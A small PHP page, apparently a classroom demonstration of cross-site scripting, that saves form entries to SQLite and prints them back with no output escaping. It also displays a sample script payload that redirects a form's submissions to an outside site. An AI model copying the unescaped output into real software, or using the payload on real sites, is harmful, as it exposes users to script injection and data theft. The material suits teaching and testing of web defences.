<?php
    try {
        $db = new PDO('sqlite:data.sqlite');
    } catch (PDOException $ex) {
        die('Erreur BDD');
    }       
    
    if(filter_has_var(INPUT_POST, 'data')){
        $sql = "INSERT INTO data (data) VALUES (:data)";
        $req = $db->prepare($sql);
        $req->bindValue(':data', filter_input(INPUT_POST,'data',FILTER_SANITIZE_STRING));
        $req->execute();
    }
    
    if(filter_has_var(INPUT_POST, 'delete')){
        $sql = "DELETE FROM data WHERE id = :id";
        $req = $db->prepare($sql);
        $req->bindValue(':id', filter_input(INPUT_POST,'id',FILTER_SANITIZE_NUMBER_INT));
        $req->execute();
    }
    
    $sql = "SELECT * FROM data";
    $req = $db->prepare($sql);
    $req->execute();
    
    $data = $req->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html>
    <head>
        <title>XSS Demo</title>
        <meta charset="UTF-8">
    </head>
    <body>
        <h1>Formulaire</h1>
        <form action="#<?php echo microtime();?>" method="POST">
            <label for="data">data : </label>
            <input type="text" name="data" id="data" placeholder="data"/>
            <button type="submit">Envoyer</button>
        </form>
        <hr/>
        <h1>Données</h1>
        <?php foreach($data as $d):?>
        <div style="margin-bottom:10px;">
            <form action="#<?php echo microtime();?>" method="POST">
                <?php echo $d['data'];?>
                <input type="hidden" name="id" value="<?php echo $d['id'];?>"/>
                <button type="submit" name="delete">Suppr</button>
            </form>
        </div>
        <?php endforeach;?>
        <hr/>
        <pre>
            <?php echo htmlentities('<script>var f=document.getElementsByTagName("form")[0]; f.action="http://www.google.com";</script>');?>
        </pre>
    </body>
</html>
    

